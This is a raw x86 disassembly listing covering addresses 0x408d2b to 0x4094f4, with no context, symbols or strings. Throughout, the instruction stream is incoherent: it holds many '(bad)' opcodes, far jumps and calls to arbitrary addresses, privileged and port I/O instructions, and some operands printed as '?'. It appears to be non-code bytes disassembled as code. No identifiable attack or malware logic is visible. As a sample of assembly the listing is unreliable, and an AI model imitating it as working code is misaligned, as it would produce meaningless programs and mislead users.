  408d2b:	lods   al,BYTE PTR ds:[esi]
  408d2c:	inc    esi
  408d2d:	dec    ebx
  408d2e:	cmc    
  408d2f:	add    eax,DWORD PTR [edx]
  408d31:	out    0x9,eax
  408d33:	xchg   edx,eax
  408d34:	aam    0xdd
  408d36:	jmp    0x83485157
  408d3b:	data16 int3 
  408d3d:	or     BYTE PTR [ebx+esi*1+0x7a],0xe5
  408d42:	jle    0x408ce9
  408d44:	xor    DWORD PTR [edi],esi
  408d46:	aaa    
  408d47:	jecxz  0x408db2
  408d49:	pop    ebp
  408d4a:	xchg   DWORD PTR ds:[esi],eax
  408d4d:	gs hlt 
  408d4f:	mov    dh,0x36
  408d51:	xor    ah,BYTE PTR [edx]
  408d53:	mov    eax,ds:0xdb687e47
  408d58:	or     bh,BYTE PTR [esi+edx*1-0x3a]
  408d5c:	jecxz  0x408d52
  408d5e:	into   
  408d5f:	pop    esi
  408d60:	adc    BYTE PTR [edx],al
  408d62:	ja     0x408d8b
  408d64:	push   edi
  408d65:	ja     0x408da5
  408d67:	sbb    bh,0x8a
  408d6a:	int    0x3
  408d6c:	fstp   TBYTE PTR [ebp-0x80]
  408d6f:	(bad)  
  408d70:	rol    BYTE PTR [edx+0x10025b4f],cl
  408d76:	cmp    bl,BYTE PTR [ecx+0x2aca55c8]
  408d7c:	leave  
  408d7d:	xor    cl,al
  408d7f:	push   edi
  408d80:	iret   
  408d81:	xchg   BYTE PTR [edx-0x5ac3325a],dh
  408d87:	add    al,0x7
  408d89:	xchg   ebp,eax
  408d8a:	jmp    0x408d9b
  408d8c:	jecxz  0x408de5
  408d8e:	test   BYTE PTR [edi],ch
  408d90:	xor    al,0x15
  408d92:	add    esi,DWORD PTR [esi+0x46df5000]
  408d98:	xor    DWORD PTR [eax],esi
  408d9a:	outs   dx,BYTE PTR ds:[esi]
  408d9b:	dec    ebx
  408d9c:	pop    esi
  408d9d:	adc    edx,DWORD PTR ds:[edi]
  408da0:	mov    al,ds:0xb813199d
  408da5:	int    0x33
  408da7:	or     al,0xd0
  408da9:	jmp    0x408ded
  408dab:	inc    eax
  408dac:	or     al,0x65
  408dae:	mov    bl,0xcb
  408db0:	fs adc al,0x6f
  408db3:	xor    BYTE PTR ds:0xb0315dcd,al
  408db9:	inc    edi
  408dba:	cld    
  408dbb:	jns    0x408e30
  408dbd:	xchg   esi,eax
  408dbe:	fnstsw WORD PTR [esi+0x38]
  408dc1:	outs   dx,DWORD PTR ds:[esi]
  408dc2:	jmp    0xf20a:0xda381fbe
  408dc9:	mov    ch,0xf4
  408dcb:	ins    DWORD PTR es:[edi],dx
  408dcc:	mov    ecx,0xf0900a97
  408dd1:	mov    WORD PTR [ebx],ss
  408dd3:	ins    DWORD PTR es:[edi],dx
  408dd4:	int    0x21
  408dd6:	dec    eax
  408dd7:	sbb    ch,dh
  408dd9:	sub    eax,0xa0fa1507
  408dde:	ror    DWORD PTR [eax],1
  408de0:	repnz and BYTE PTR [esp+eiz*2-0x20],0xa
  408de6:	push   ecx
  408de7:	ss adc ebp,0x96db8294
  408dee:	sti    
  408def:	scas   eax,DWORD PTR es:[edi]
  408df0:	imul   esi,eax,0x3af69bfd
  408df6:	test   BYTE PTR [ecx],ch
  408df8:	mov    dh,0x64
  408dfa:	inc    edx
  408dfb:	ret    
  408dfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408dfd:	leave  
  408dfe:	sbb    edi,esp
  408e00:	mov    al,ds:0xb4601c5c
  408e05:	pop    esi
  408e06:	loope  0x408dca
  408e08:	(bad)  
  408e09:	dec    edi
  408e0a:	enter  0xbb57,0xf0
  408e0e:	xor    ebx,0x423a0189
  408e14:	mov    ecx,0x61ddcb3c
  408e19:	enter  0xb56c,0xf3
  408e1d:	and    BYTE PTR [edx],ah
  408e1f:	sbb    BYTE PTR [edi+eax*4-0x1ec8f622],dl
  408e26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e27:	test   BYTE PTR [ecx],ah
  408e29:	fs jns 0x408e5d
  408e2c:	push   ebp
  408e2d:	pop    eax
  408e2e:	data16 loop 0x408de6
  408e31:	into   
  408e32:	popf   
  408e33:	adc    ah,BYTE PTR [edi]
  408e35:	cwde   
  408e36:	fld    QWORD PTR [ecx-0x22]
  408e39:	jmp    0x4a88:0x60e0bb05
  408e40:	ret    
  408e41:	xchg   ebp,eax
  408e42:	ret    0x58ee
  408e45:	cwde   
  408e46:	cmc    
  408e47:	adc    BYTE PTR [edx+0x75],0x85
  408e4b:	sbb    al,0x35
  408e4d:	add    esi,DWORD PTR ss:[edi+0x7f]
  408e51:	and    eax,edi
  408e53:	call   0xf4e39404
  408e58:	arpl   WORD PTR ds:0xbf40da44,dx
  408e5e:	mov    edi,DWORD PTR ds:0x8c63c71d
  408e64:	loop   0x408eb1
  408e66:	stos   DWORD PTR es:[edi],eax
  408e67:	push   cs
  408e68:	scas   eax,DWORD PTR es:[edi]
  408e69:	cwde   
  408e6a:	and    eax,0x50295e9b
  408e6f:	jnp    0x408e20
  408e71:	lahf   
  408e72:	inc    edx
  408e73:	mov    ds:0xc9d3bfd,al
  408e78:	inc    ebp
  408e79:	sub    eax,0x2dce5a7
  408e7e:	mov    eax,0x9e66932c
  408e83:	cli    
  408e84:	sub    cl,BYTE PTR [ebx]
  408e86:	fadd   DWORD PTR [edi-0x7f9bb3d]
  408e8c:	push   cs
  408e8d:	outs   dx,DWORD PTR ds:[esi]
  408e8e:	por    mm4,mm4
  408e91:	jae    0x408e82
  408e93:	ins    BYTE PTR es:[edi],dx
  408e94:	les    ebx,FWORD PTR [ecx-0x2f]
  408e97:	sbb    al,0x72
  408e99:	mov    dl,0x5c
  408e9b:	xor    al,0x64
  408e9d:	or     DWORD PTR [esi],ebp
  408e9f:	pop    ecx
  408ea0:	dec    esi
  408ea1:	les    ecx,FWORD PTR [esi]
  408ea3:	push   0x5c
  408ea5:	std    
  408ea6:	sbb    ch,BYTE PTR [esi+0x731c9f2d]
  408eac:	aaa    
  408ead:	sbb    eax,0xaaeb9409
  408eb2:	fwait
  408eb3:	pushf  
  408eb4:	push   eax
  408eb5:	dec    ebp
  408eb6:	lock sub DWORD PTR [edi],esp
  408eb9:	test   eax,0x30ed657f
  408ebe:	out    dx,al
  408ebf:	je     0x408e79
  408ec1:	das    
  408ec2:	hlt    
  408ec3:	jmp    0x408f02
  408ec5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ec6:	ins    BYTE PTR es:[edi],dx
  408ec7:	shr    BYTE PTR [edx+edx*2],cl
  408eca:	dec    esi
  408ecb:	enter  0xd4db,0x23
  408ecf:	lods   eax,DWORD PTR ds:[esi]
  408ed0:	xchg   esp,eax
  408ed1:	lods   eax,DWORD PTR ds:[esi]
  408ed2:	es call 0xa9bd680b
  408ed8:	das    
  408ed9:	mov    al,0x62
  408edb:	lods   eax,DWORD PTR ds:[esi]
  408edc:	add    dh,0x1b
  408edf:	mov    edx,0xfb5f3a50
  408ee4:	fwait
  408ee5:	(bad)  
  408ee6:	push   ebp
  408ee7:	pop    es
  408ee8:	jge    0x408ed1
  408eea:	(bad)  
  408eeb:	and    al,0xf5
  408eed:	(bad)  
  408eee:	in     al,dx
  408eef:	adc    eax,0xab45719d
  408ef4:	in     al,dx
  408ef5:	xor    dl,dh
  408ef7:	mov    DWORD PTR [esp+eiz*8-0x7e16c133],0x9f70e320
  408f02:	push   ss
  408f03:	mov    eax,?
  408f05:	mov    bl,0xa4
  408f07:	inc    esp
  408f08:	ja     0x408eba
  408f0a:	push   0xfffffff9
  408f0c:	imul   edx,ebp,0x40
  408f0f:	in     eax,0xb4
  408f11:	pop    ebp
  408f12:	nop
  408f13:	push   esp
  408f14:	sub    al,0xab
  408f16:	scas   eax,DWORD PTR es:[edi]
  408f17:	pop    edx
  408f18:	icebp  
  408f19:	mov    bh,0x8e
  408f1b:	sub    bh,BYTE PTR [ebx]
  408f1d:	(bad)  
  408f1e:	aad    0x9b
  408f20:	fwait
  408f21:	inc    edx
  408f22:	inc    eax
  408f23:	mov    eax,ds:0x207255c1
  408f28:	mov    ds:0x8eef0d52,al
  408f2d:	daa    
  408f2e:	xlat   BYTE PTR ds:[ebx]
  408f2f:	ins    BYTE PTR es:[edi],dx
  408f30:	mov    eax,0x5c6e3fe7
  408f35:	call   0xe0e8:0xf6c28563
  408f3c:	fnstcw WORD PTR ds:0xabc9f1d8
  408f42:	jecxz  0x408f8a
  408f44:	mov    bh,0x36
  408f46:	aam    0xf6
  408f48:	push   eax
  408f49:	push   es
  408f4a:	shl    DWORD PTR [ecx+0x59],0xad
  408f4e:	mov    bl,0xbd
  408f50:	mov    dh,0xaa
  408f52:	and    ah,ch
  408f54:	xor    al,0xc2
  408f56:	jno    0x408fcc
  408f58:	in     al,0x81
  408f5a:	test   DWORD PTR [edi+esi*1-0x5b],0x448b3168
  408f62:	push   ecx
  408f63:	mov    esp,0xb8a53796
  408f68:	sub    ah,BYTE PTR [ebx-0x45c4b95c]
  408f6e:	pandn  mm3,QWORD PTR [eax]
  408f71:	loopne 0x408f0f
  408f73:	jecxz  0x408f50
  408f75:	bound  ecx,QWORD PTR [esi+edi*8]
  408f78:	inc    ebp
  408f79:	inc    edx
  408f7a:	mov    ebx,0x7526eb40
  408f7f:	mov    ?,WORD PTR [edx-0x3c]
  408f82:	sbb    cl,BYTE PTR [eax-0x6a]
  408f85:	aam    0x8
  408f87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f88:	ins    DWORD PTR es:[edi],dx
  408f89:	aam    0x83
  408f8b:	std    
  408f8c:	retf   0x312a
  408f8f:	sbb    eax,0x4ffda549
  408f94:	mov    esp,edx
  408f96:	retf   
  408f97:	nop
  408f98:	rcl    edi,1
  408f9a:	jbe    0x408f52
  408f9c:	pop    edi
  408f9d:	add    al,0x1b
  408f9f:	jae    0x408fc0
  408fa1:	adc    cl,BYTE PTR [edi-0x8ede32]
  408fa7:	sub    esp,DWORD PTR [eax-0x48]
  408faa:	xchg   ebx,eax
  408fab:	mov    esi,0xf803c0b3
  408fb0:	arpl   WORD PTR [edx+eiz*2],bx
  408fb3:	xchg   edi,eax
  408fb4:	dec    esi
  408fb5:	adc    al,0x48
  408fb7:	(bad)  
  408fb8:	push   cs
  408fb9:	inc    edx
  408fba:	push   ebp
  408fbb:	pushf  
  408fbc:	je     0x409039
  408fbe:	aam    0xa8
  408fc0:	mov    ecx,0x24648499
  408fc5:	xchg   edx,eax
  408fc6:	hlt    
  408fc7:	push   0xffffff8c
  408fc9:	(bad)  
  408fca:	jne    0x408f8e
  408fcc:	jmp    0xca29:0xb5aa0124
  408fd3:	add    BYTE PTR [edx],dh
  408fd5:	enter  0x56ad,0x36
  408fd9:	out    0x70,al
  408fdb:	sub    DWORD PTR [ecx],ebx
  408fdd:	xchg   DWORD PTR [ecx+0x552fdef0],esp
  408fe3:	(bad)  
  408fe4:	int3   
  408fe5:	inc    esi
  408fe6:	push   eax
  408fe7:	ret    0x5361
  408fea:	and    esi,ecx
  408fec:	int3   
  408fed:	call   0xf5446bcb
  408ff2:	push   ecx
  408ff3:	retf   
  408ff4:	push   ds
  408ff5:	mov    esi,0xe3356333
  408ffa:	ds inc esp
  408ffc:	push   edx
  408ffd:	fisub  WORD PTR [ebp+eiz*1+0x14]
  409001:	loopne 0x409019
  409003:	mov    dh,0xb5
  409005:	call   0x749403a6
  40900a:	out    dx,al
  40900b:	adc    WORD PTR [ecx+0xa9b0a0c],0x7ab7
  409014:	ins    BYTE PTR es:[edi],dx
  409015:	push   ss
  409016:	xchg   edi,eax
  409017:	clc    
  409018:	push   es
  409019:	cmp    eax,0x2bc48426
  40901e:	xchg   edi,eax
  40901f:	test   DWORD PTR [eax-0x2c78c288],ebx
  409025:	inc    edi
  409026:	push   edi
  409027:	sub    ch,BYTE PTR [ebp-0x2c]
  40902a:	and    al,0xd6
  40902c:	out    0xe0,al
  40902e:	in     al,0xf1
  409030:	aaa    
  409031:	jle    0x409012
  409033:	pop    esi
  409034:	ds cmp cl,dl
  409037:	fwait
  409038:	cmp    DWORD PTR [esi+0x34b6d551],eax
  40903e:	dec    esi
  40903f:	push   ds
  409040:	stc    
  409041:	push   0x32
  409043:	xchg   DWORD PTR [edi],esp
  409045:	sar    al,0x4e
  409048:	xchg   esi,eax
  409049:	js     0x4090c6
  40904b:	pusha  
  40904c:	call   0x524c:0xfe42ae96
  409053:	jmp    FWORD PTR [edx+esi*4+0x7922e75f]
  40905a:	sub    BYTE PTR [edi-0x68674619],cl
  409060:	cmp    al,0x3a
  409062:	mov    dl,0x3f
  409064:	jbe    0x40904c
  409066:	dec    edx
  409067:	and    bh,BYTE PTR [ecx-0x17]
  40906a:	jae    0x409038
  40906c:	mov    ebx,0x950b7d1d
  409071:	xchg   esi,eax
  409072:	jge    0x409058
  409074:	js     0x409003
  409076:	mov    ebx,0x3f514780
  40907b:	mov    edi,0xc39b0c9c
  409080:	pop    ecx
  409081:	jmp    0xa3aeb074
  409086:	inc    ebx
  409087:	add    al,0xf0
  409089:	aas    
  40908a:	lahf   
  40908b:	mov    ebx,DWORD PTR [edi+0x38ea9c31]
  409091:	push   0xe296b3e4
  409096:	fsubp  st(5),st
  409098:	jge    0x4090ed
  40909a:	jge    0x40911a
  40909c:	shl    DWORD PTR [edx+0x1477a8],cl
  4090a2:	push   ebp
  4090a3:	push   ebp
  4090a4:	mov    ds,WORD PTR [ecx+0x5e]
  4090a7:	inc    eax
  4090a8:	jle    0x409052
  4090aa:	cmc    
  4090ab:	pop    ebp
  4090ac:	and    al,0xfc
  4090ae:	pop    ds
  4090af:	push   es
  4090b0:	push   eax
  4090b1:	push   edi
  4090b2:	lahf   
  4090b3:	adc    bl,BYTE PTR [ecx]
  4090b5:	lods   al,BYTE PTR ds:[esi]
  4090b6:	test   BYTE PTR [edi],bh
  4090b8:	and    ecx,ebp
  4090ba:	enter  0xed66,0xd6
  4090be:	or     al,0x33
  4090c0:	out    0x8b,al
  4090c2:	dec    ebp
  4090c3:	imul   ecx,DWORD PTR [esi+0x3f798a62],0xffffffaf
  4090ca:	lahf   
  4090cb:	sbb    al,0xd0
  4090cd:	pushf  
  4090ce:	std    
  4090cf:	out    0x23,al
  4090d1:	sub    ecx,DWORD PTR [ebx+0x16f33078]
  4090d7:	lock cmp eax,0x849af553
  4090dd:	mov    ds:0xf4c15c52,al
  4090e2:	ret    0xa980
  4090e5:	cs loopne 0x40914b
  4090e8:	retf   0xcfa7
  4090eb:	inc    esp
  4090ec:	enter  0x7091,0x49
  4090f0:	fisub  WORD PTR [edx-0x3f]
  4090f3:	call   0xb3abaad1
  4090f8:	dec    esp
  4090f9:	inc    edx
  4090fa:	xchg   ebp,eax
  4090fb:	mov    eax,ds:0xb808d65f
  409100:	sbb    eax,0x6301eb08
  409105:	sub    ebp,0x21
  409108:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409109:	or     dl,0x93
  40910c:	lods   eax,DWORD PTR ds:[esi]
  40910d:	mov    al,ds:0xde786561
  409112:	mov    edi,0x94d91df2
  409117:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409118:	pop    ebp
  409119:	pop    esi
  40911a:	jl     0x4090d5
  40911c:	adc    cl,BYTE PTR [esi+esi*2]
  40911f:	stos   DWORD PTR es:[edi],eax
  409120:	bound  eax,QWORD PTR [ecx+0x70]
  409123:	add    DWORD PTR [ebp-0x3030669e],esp
  409129:	push   0x17
  40912b:	or     DWORD PTR [ebx+0x65c811c6],eax
  409131:	or     dl,dh
  409133:	and    eax,0xb5464b35
  409138:	test   al,0xce
  40913a:	iret   
  40913b:	mov    bl,BYTE PTR ds:[ecx+0x6d]
  40913f:	icebp  
  409140:	dec    edx
  409141:	ds in  eax,dx
  409143:	or     al,0x0
  409145:	xchg   ebp,eax
  409146:	outs   dx,DWORD PTR ds:[esi]
  409147:	dec    edi
  409148:	mov    eax,ds:0x800505c7
  40914d:	bound  esp,QWORD PTR [eax-0x21]
  409150:	push   ecx
  409151:	xor    bl,bh
  409153:	ror    DWORD PTR [edx],1
  409155:	pop    ebx
  409156:	pushf  
  409157:	mov    gs:0x529b0c38,eax
  40915d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40915e:	pushf  
  40915f:	push   0xe05f1975
  409164:	dec    eax
  409165:	adc    al,0x9c
  409167:	ret    
  409168:	dec    esi
  409169:	sbb    BYTE PTR [esi-0x1aa285d5],bl
  40916f:	mov    esi,0x517d540b
  409174:	add    BYTE PTR ds:0xf11e5861,al
  40917a:	leave  
  40917b:	mov    ebx,0x9bacf196
  409180:	ret    0x40ec
  409183:	out    dx,al
  409184:	adc    al,0x39
  409186:	call   0xd339aab6
  40918b:	or     ebp,esi
  40918d:	ds pop eax
  40918f:	retf   0x88ff
  409192:	add    BYTE PTR [ebx+eiz*4],ch
  409195:	sub    esi,ebx
  409197:	adc    DWORD PTR [ebx-0x38],0x95f6f7a0
  40919e:	ins    DWORD PTR es:[edi],dx
  40919f:	or     eax,DWORD PTR [edi]
  4091a1:	je     0x40919b
  4091a3:	lock out 0xcb,eax
  4091a6:	sub    BYTE PTR [edi+ebp*2],0x34
  4091aa:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4091ac:	pop    edi
  4091ad:	cmpxchg bh,ch
  4091b0:	aam    0x5b
  4091b2:	stc    
  4091b3:	pop    esp
  4091b4:	out    dx,eax
  4091b5:	xor    eax,0x340f280
  4091ba:	pop    edx
  4091bb:	sahf   
  4091bc:	dec    ebp
  4091bd:	mov    eax,0xbed25cc5
  4091c2:	cmp    edx,DWORD PTR [ebx+esi*1-0xb136b12]
  4091c9:	(bad)  
  4091ca:	retf   
  4091cb:	sub    al,0x3e
  4091cd:	xor    edx,esp
  4091cf:	inc    esp
  4091d0:	in     al,dx
  4091d1:	shr    DWORD PTR [di+0xbbc],1
  4091d6:	rcl    edi,0xe9
  4091d9:	aam    0xd8
  4091db:	and    bl,bl
  4091dd:	dec    ecx
  4091de:	mov    ds:0x22ebe88d,eax
  4091e3:	jne    0x40920a
  4091e5:	adc    eax,0xcab06e02
  4091ea:	fistp  QWORD PTR [eax]
  4091ec:	fbstp  TBYTE PTR [ecx-0x23]
  4091ef:	mov    ebp,0xbc64a465
  4091f4:	lock stos BYTE PTR es:[edi],al
  4091f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091f7:	push   0x26
  4091f9:	or     bl,BYTE PTR [ebx]
  4091fb:	mov    ds:0x84a9ff69,eax
  409200:	repnz dec ebp
  409202:	push   esp
  409203:	jl     0x40926d
  409205:	xor    BYTE PTR [ebx-0x68],cl
  409208:	adc    al,0xf
  40920a:	je     0x40925d
  40920c:	(bad)  
  40920d:	aam    0x2b
  40920f:	nop
  409210:	fs pop ecx
  409212:	es dec edx
  409214:	in     eax,dx
  409215:	into   
  409216:	aas    
  409217:	call   0x1c0e:0x4e0f239
  40921e:	add    edx,ebp
  409220:	inc    esp
  409221:	sti    
  409222:	(bad)  
  409223:	fild   DWORD PTR [ebp+0x77086354]
  409229:	mov    gs,ebx
  40922b:	and    esi,ecx
  40922d:	push   esp
  40922e:	push   0x6e4d3857
  409233:	ficom  DWORD PTR [ebx-0x3fb80a85]
  409239:	push   esp
  40923a:	mov    ?,WORD PTR [edx+0x24fc0fc0]
  409240:	sub    eax,0x45877bd2
  409245:	pop    edx
  409246:	scas   eax,DWORD PTR es:[edi]
  409247:	int    0x64
  409249:	mov    ecx,DWORD PTR [edx+0x5d]
  40924c:	jne    0x4091dd
  40924e:	loope  0x40923e
  409250:	fnsave [ecx]
  409252:	test   eax,edx
  409254:	xor    dl,BYTE PTR [ebp+0x1f]
  409257:	cmp    DWORD PTR [ecx+0x20],ecx
  40925a:	mov    cl,0x9e
  40925c:	int    0xbd
  40925e:	or     DWORD PTR [eax+0x38],ebp
  409261:	push   0xfffffff0
  409263:	cwde   
  409264:	in     eax,dx
  409265:	push   esi
  409266:	and    eax,0xd419d7a
  40926b:	rcr    DWORD PTR [ebp-0x14],cl
  40926e:	xor    DWORD PTR [ebx+esi*4+0x9],0x9ba9da03
  409276:	cs in  eax,0xee
  409279:	pusha  
  40927a:	xchg   BYTE PTR [eax-0x34],dh
  40927d:	outs   dx,BYTE PTR ds:[esi]
  40927e:	jp     0x4092e2
  409280:	aad    0x19
  409282:	(bad)  
  409283:	loope  0x40929c
  409285:	iret   
  409286:	retf   0xe516
  409289:	sbb    cl,BYTE PTR [ecx-0x5a]
  40928c:	cmp    bh,dh
  40928e:	out    0xb9,al
  409290:	push   cs
  409291:	outs   dx,DWORD PTR ds:[esi]
  409292:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409293:	shl    BYTE PTR [edx-0x2f],cl
  409296:	cdq    
  409297:	mov    bl,0xff
  409299:	add    eax,0xbd15279d
  40929e:	xor    edx,DWORD PTR [eax+ebx*2-0x75]
  4092a2:	imul   DWORD PTR [ebx-0x54]
  4092a5:	and    BYTE PTR [ebx],dl
  4092a7:	adc    eax,DWORD PTR [ecx-0x669caef4]
  4092ad:	enter  0xf9fa,0x1e
  4092b1:	xor    BYTE PTR [ebx-0x14381410],dl
  4092b7:	stos   BYTE PTR es:[edi],al
  4092b8:	pop    ss
  4092b9:	dec    esp
  4092ba:	sar    DWORD PTR [ebx+eiz*4-0x1],cl
  4092be:	xchg   esp,eax
  4092bf:	fiadd  WORD PTR [edi+0x6b]
  4092c2:	je     0x4092ef
  4092c4:	sub    eax,0x859c3800
  4092c9:	rcl    BYTE PTR [ebx+0x50877dd9],1
  4092cf:	arpl   si,sp
  4092d1:	add    al,ch
  4092d3:	mov    ebp,0xbff1149c
  4092d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092d9:	test   DWORD PTR [eax],edi
  4092db:	pop    edx
  4092dc:	xchg   ebp,eax
  4092dd:	repz loope 0x40932b
  4092e0:	adc    dl,BYTE PTR [ebp-0x4d15f924]
  4092e6:	pop    ebx
  4092e7:	xor    al,0x2
  4092e9:	mov    ebx,0xe07e8898
  4092ee:	push   ecx
  4092ef:	jp     0x409305
  4092f1:	mov    bh,0x7f
  4092f3:	aam    0x77
  4092f5:	adc    eax,0x67217fa6
  4092fa:	sbb    eax,0xe2c50ceb
  4092ff:	xchg   ebp,eax
  409300:	dec    ebx
  409301:	sub    BYTE PTR [ebp-0x18f2f031],bh
  409307:	or     al,BYTE PTR [ebp+0x7f]
  40930a:	test   DWORD PTR [esi],eax
  40930c:	jnp    0x409338
  40930e:	push   0x501284c
  409313:	cmp    DWORD PTR [edi-0x5ae90ae9],ebp
  409319:	fcmovne st,st(6)
  40931b:	retf   
  40931c:	mov    edx,fs
  40931e:	lock inc edx
  409320:	jge    0x3a967d6b
  409326:	mov    ebp,DWORD PTR [edi+0x40ef5b6e]
  40932c:	sar    BYTE PTR [ecx],cl
  40932e:	cmc    
  40932f:	or     DWORD PTR [ebp-0x4ceeceb5],edx
  409335:	mov    ds:0xf7c30857,eax
  40933a:	pushf  
  40933b:	stos   BYTE PTR es:[edi],al
  40933c:	jns    0x4092f6
  40933e:	ds jp  0x4093b5
  409341:	mov    cl,0x8
  409343:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409344:	jge    0x409344
  409346:	mov    al,ds:0xa9e99cb5
  40934b:	jle    0x4093b2
  40934d:	es sbb al,0x93
  409350:	test   al,0xeb
  409352:	lods   eax,DWORD PTR ds:[esi]
  409353:	push   0xf38183c4
  409358:	xchg   DWORD PTR [edx+0x23afd40b],ebx
  40935e:	fisubr DWORD PTR [esi+0x3b6e9906]
  409364:	mov    ebp,cs
  409366:	add    eax,0xc3443172
  40936b:	bound  ecx,QWORD PTR [esi+ebp*2]
  40936e:	push   esp
  40936f:	stc    
  409370:	mov    esi,ecx
  409372:	ins    BYTE PTR es:[edi],dx
  409373:	or     eax,0xda6628ca
  409378:	mov    al,0x36
  40937a:	lea    edi,[edi+0xb]
  40937d:	mov    ds:0xa121c3e0,eax
  409382:	mov    ds:0x5bcfb1b2,eax
  409387:	add    DWORD PTR [esi-0x71],edi
  40938a:	and    ebp,DWORD PTR [ecx+0x37e7ccf3]
  409390:	push   ebx
  409391:	out    dx,al
  409392:	add    eax,0xfae86f3a
  409397:	scas   al,BYTE PTR es:[edi]
  409398:	test   bl,bh
  40939a:	iret   
  40939b:	mov    bl,0x19
  40939d:	push   es
  40939e:	sbb    dh,BYTE PTR [ebp-0x2c]
  4093a1:	cwde   
  4093a2:	lds    ecx,FWORD PTR [edx+0x71]
  4093a5:	and    al,0x61
  4093a7:	adc    bl,al
  4093a9:	cmp    cl,BYTE PTR [bx+si-0x383f]
  4093ae:	mov    al,ds:0xdf6eb721
  4093b3:	in     eax,0xf6
  4093b5:	xor    eax,0x2bb8ef20
  4093ba:	dec    eax
  4093bb:	popf   
  4093bc:	test   DWORD PTR [esi],0x9c9d23e5
  4093c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4093c3:	sub    BYTE PTR [ebp-0x4dc0ba7f],dh
  4093c9:	scas   eax,DWORD PTR es:[edi]
  4093ca:	mov    di,0x6aaf
  4093ce:	push   edx
  4093cf:	inc    eax
  4093d0:	ret    
  4093d1:	jo     0x40936e
  4093d3:	(bad)  
  4093d4:	push   ds
  4093d5:	(bad)  
  4093d6:	imul   ecx,DWORD PTR [eax+0x60],0xe36d2d0d
  4093dd:	sub    bl,cl
  4093df:	sub    ebp,ecx
  4093e1:	cmp    DWORD PTR [ecx+ecx*8-0x4c61df64],esp
  4093e8:	cmc    
  4093e9:	xchg   esp,eax
  4093ea:	xchg   ebx,eax
  4093eb:	push   edi
  4093ec:	fwait
  4093ed:	add    DWORD PTR [esi],esp
  4093ef:	scas   al,BYTE PTR es:[edi]
  4093f0:	hlt    
  4093f1:	outs   dx,BYTE PTR ds:[esi]
  4093f2:	jmp    0x2150d012
  4093f7:	push   eax
  4093f8:	jp     0x4093cc
  4093fa:	popf   
  4093fb:	fs or  eax,0x8cd7a23c
  409401:	pushf  
  409402:	std    
  409403:	jbe    0x4093df
  409405:	add    dl,BYTE PTR [esi+0xd]
  409408:	leave  
  409409:	adc    DWORD PTR [ebx-0xd721002],0x63
  409410:	jb     0x40944e
  409412:	(bad)  
  409413:	dec    ebp
  409414:	pop    ebp
  409415:	lods   al,BYTE PTR ds:[esi]
  409416:	adc    al,0x31
  409418:	sti    
  409419:	xor    BYTE PTR [ebx-0x47],ah
  40941c:	scas   eax,DWORD PTR es:[edi]
  40941d:	mov    ebx,0x50a7e33
  409422:	iret   
  409423:	outs   dx,DWORD PTR ds:[esi]
  409424:	push   ebx
  409425:	pop    ecx
  409426:	or     al,0x8a
  409428:	bound  eax,QWORD PTR [ebx]
  40942a:	in     eax,0x4e
  40942c:	out    0xe9,eax
  40942e:	mov    ebp,0xa7328cb6
  409433:	sahf   
  409434:	jge    0x409423
  409436:	punpcklbw mm7,DWORD PTR [edi-0x37]
  40943a:	loopne 0x4093f4
  40943c:	fild   QWORD PTR [ebx]
  40943e:	aam    0xc7
  409440:	mov    WORD PTR [ebx-0xd],es
  409443:	cmc    
  409444:	sbb    al,0xf6
  409446:	call   0xad82:0xc4521d91
  40944d:	inc    eax
  40944e:	ins    BYTE PTR es:[edi],dx
  40944f:	fwait
  409450:	sbb    edx,DWORD PTR [ecx-0x7ed1f5fb]
  409456:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409457:	mov    edi,0xf21e4511
  40945c:	stc    
  40945d:	or     DWORD PTR [ebp+0x7a374f2d],esi
  409463:	retf   0xc6af
  409466:	xchg   ebp,eax
  409467:	adc    edx,DWORD PTR [ecx+0x26]
  40946a:	mov    ch,0xda
  40946c:	(bad)  
  40946d:	mov    edx,0xdea04c0
  409472:	jmp    0x40942e
  409474:	inc    edx
  409475:	dec    edx
  409476:	cmc    
  409477:	and    dl,BYTE PTR [ebp-0x7e]
  40947a:	or     eax,0x3a91c269
  40947f:	inc    ecx
  409480:	add    ebp,DWORD PTR [edx]
  409482:	call   0xaa6b:0x429c2686
  409489:	lods   al,BYTE PTR ds:[esi]
  40948a:	cmc    
  40948b:	sbb    ch,BYTE PTR [ecx-0x7accabfc]
  409491:	push   ebp
  409492:	push   0xffffffad
  409494:	inc    ecx
  409495:	mov    ebx,0xca81bf17
  40949a:	inc    ecx
  40949b:	jbe    0x409510
  40949d:	or     al,0xe3
  40949f:	or     ebp,DWORD PTR [edx+0x77]
  4094a2:	leave  
  4094a3:	xor    DWORD PTR [eax],ebp
  4094a5:	imul   esp,DWORD PTR [esi+eiz*2-0x433eac9f],0x28bc9e56
  4094b0:	inc    edx
  4094b1:	mov    eax,0x4c9ab2b8
  4094b6:	dec    ecx
  4094b7:	push   cs
  4094b8:	in     al,0xb7
  4094ba:	enter  0xd113,0x48
  4094be:	jle    0x4094ad
  4094c0:	inc    esi
  4094c1:	inc    esi
  4094c2:	mov    eax,ds:0xee965af4
  4094c7:	jbe    0x409533
  4094c9:	fdivp  st(3),st
  4094cb:	mov    al,ds:0x8a4af31
  4094d0:	(bad)  
  4094d2:	mov    al,ds:0x433be2be
  4094d7:	dec    BYTE PTR [ecx+0x33]
  4094da:	pop    esi
  4094db:	mov    ebx,0x54ba8ed5
  4094e0:	or     BYTE PTR [eax],bh
  4094e2:	add    edx,DWORD PTR [ecx-0x7271ef13]
  4094e8:	out    dx,eax
  4094e9:	mov    cl,0xf2
  4094eb:	mov    bh,BYTE PTR [esi]
  4094ed:	repnz les esi,FWORD PTR [edi+eiz*2]
  4094f1:	cmp    BYTE PTR [ecx+0x65],bh
  4094f4:	les    ebx,FWORD PTR [eax+0x74eab35]
